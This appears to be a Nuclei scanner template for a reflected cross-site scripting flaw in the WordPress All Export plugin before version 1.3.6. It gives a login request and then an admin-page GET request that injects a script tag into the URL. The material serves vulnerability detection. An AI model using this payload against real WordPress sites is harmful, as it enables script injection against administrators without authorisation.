# Nuclei Template: WordPress All Export <1.3.6 - Cross-Site Scripting
**Template ID:** wp-all-export-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`wp-all-export-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress All Export plugin before version 1.3.6 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/de330a59-d64d-40be-86df-98997949e5e4
